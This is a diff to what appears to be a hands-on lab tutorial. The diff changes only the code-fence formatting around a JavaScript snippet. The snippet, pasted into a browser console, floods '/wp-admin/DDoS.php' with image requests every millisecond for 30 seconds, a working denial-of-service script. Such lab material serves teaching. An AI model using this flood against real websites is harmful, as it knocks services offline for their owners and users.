@@ -26,7 +26,7 @@ click the Console button to access the console:
 Copy the following command and paste it in the console and click enter:
 
 
-`
+```sh
 function imgflood() { 
   let URI = '/wp-admin/DDoS.php?'
   let pic = new Image()
@@ -37,7 +37,7 @@ function imgflood() {
 let DDoSTimer = setInterval(imgflood, 1); //Run it every 1 ms
 
 setTimeout(() => clearInterval(DDoSTimer), 30000); //Stop running in 30 sec
-`{{copy}}
+```{{copy}}
 
 ![Image](./assets/ConsoleAddCommand.png)
 
